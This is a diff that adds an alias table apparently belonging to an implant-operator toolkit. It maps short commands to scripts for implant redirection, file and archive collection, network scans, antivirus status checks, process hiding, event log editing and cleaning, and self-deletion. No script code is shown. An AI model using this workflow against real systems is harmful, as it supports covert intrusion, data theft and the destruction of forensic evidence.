@@ -1,0 +1,36 @@
+checkci1	checklibrary -library advapi32.dll -base 0x77dc0000 -data 0x77dc1049 240
+checkci2	checklibrary -library advapi32.dll -base 0x77d90000 -data 0x77d91049 240
+hour		background dir * -path * -recursive -max 0 -age 1
+nhour		background dir * -path * -recursive -max 0 -age %ep_cmd_args%
+epr		script epredirect.eps
+cir		script ciredirect.eps
+scan		script scanner.eps
+jscan		script jscanner.eps
+rpc		script rpctouch.eps
+we		script windowsexplore.eps
+rarget		script rarget.eps auto auto auto
+copyget		script copyget.eps
+goodget		script goodget.eps
+st		script st.eps
+arparp		script arp.eps
+imr		script implantredirect.eps
+unixredirect	script unixredirect.eps
+vscan		script vscan.eps
+yak		script Yak.eps
+yak2		script yak2.eps
+dirget		script dirget2.eps %ep_cmd_args%
+quitanddelete	script safeQuit.eps
+cangetout	script cangetout.eps
+olympus		script olympus.eps
+mcafeestatus	script mcafeestatus.eps
+checkprocess	script checkProcess.eps %ep_cmd_args%
+kasstatus	script kasstatus.eps
+kasstatusreg	script kasstatusreg.eps
+software	script installedPrograms.eps %ep_cmd_args%
+checkpsp	script checkpsp.eps
+eventlogedit	script safeEventlogedit.eps
+processhide	script safeProcessHide.eps
+datesummary	script datesummary.eps
+ziplist		script unzip.eps %ep_cmd_args%
+cursetingle	script cursetingle.eps
+eventlogclean	script eventlogclean.eps %ep_cmd_args%
